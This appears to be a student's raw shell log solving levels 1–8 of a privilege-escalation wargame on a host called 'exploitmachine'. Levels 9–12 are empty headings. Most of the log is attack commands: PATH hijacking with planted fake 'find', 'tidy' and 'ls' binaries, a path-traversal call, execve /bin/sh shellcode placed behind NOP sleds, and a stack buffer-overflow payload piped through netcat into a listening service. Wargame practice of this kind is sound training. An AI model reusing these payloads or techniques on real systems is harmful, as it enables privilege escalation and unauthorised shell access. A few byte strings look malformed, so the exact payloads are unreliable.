level 1
ls -la
strace ./1
echo ~
echo $HOME
$HOME=/var/challenge/level1
echo $HOME
1./1
cat 1
ltrace ./1

level 2
export PATH=/home/17099618/:$PATH
tidy
ls /home/17099618/tidy
ls -l /home/17099618/tidy
chmod +x  /home/17099618/tidy
tidy
/home/17099618/tidy
PATH=/home/17099618/:$PATH ./2 $(mktemp)


level 3
man find 
strace -f ./3 
echo $PATH
cd ~
mkdir bin
cd bin
ls
nano find
PATH=~/bin:$PATH
echo $PATH
cd /var/challenge/level3
ls
strace -f ./3 aol
cd 
ls
cd bin
ls 
chmod 777 find
./3 aol

level 4
strace -f ./4 ls aol
strace -f ./4  bin/aol
cd var
ls
echo $HOME
cd /home
ls
cd ..
ls
./4 ../../../../../home/17099618/bin/find

level 5
cd /var/challenge/level5
ls
Cat 5.c
./5
echo $SHELL
/bin/bash
 gdb ./5
5 1 1
export SHELLCODE=$(perl -e 'print "\x90" x 200 . "\x31\xc0\x50\x68\x2f\x
2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" ')
17099618@exploitmachine:/var/challenge/level5$ gdb
 ./5
./5 11 bffff8c3
$ l33t

level 6
ls
export SHELLCODE=$(perl 'print "\x90" x 256 . "")
./6 uniq $(perl -e 'print "\x90" x 256 . "/home/17099618/bin/find"')


level 7
17099618@exploitmachine:~$ ls
bin  chmod  cs3  house  tidy  tidy.sh  +x
touch ls
nano ls
cat tidy
l33t
!#bin/sh


chmod 777 ls
cd /var/challenge/level7
ls
./7 7.cmd
7  7.c  7.cmd
PATH=~:$PATH
./7 7.cmd
/home/17099618/ls: 1: /home/17099618/ls: !#/bin/sh: not found
Adding user `17099618' to group `lev8' ...
Adding user 17099618 to group lev8
Done.

level 8
/var/challenge/level8/8  -p 9040

echo $(perl -e 'print "A" x 65476 . "\x31\xc0\x50\x68\x6c\x33\x33\x74\x68\x62\x69\x6e\x2f\x68\x63\x61\x6c\x2f\x68\x72\x2f\x6c\x6f\x68\x2f\x2f\x75\x73\x89\xe3\x50\x53\x$\x53\x89\xe1\xb0\x0b\xcd\x80" . "B" x 30 . "\xfc\xf9\xfd\xbf"') | netcat 0.0.0.0 9040

level 9


level 10
level 11
level 12
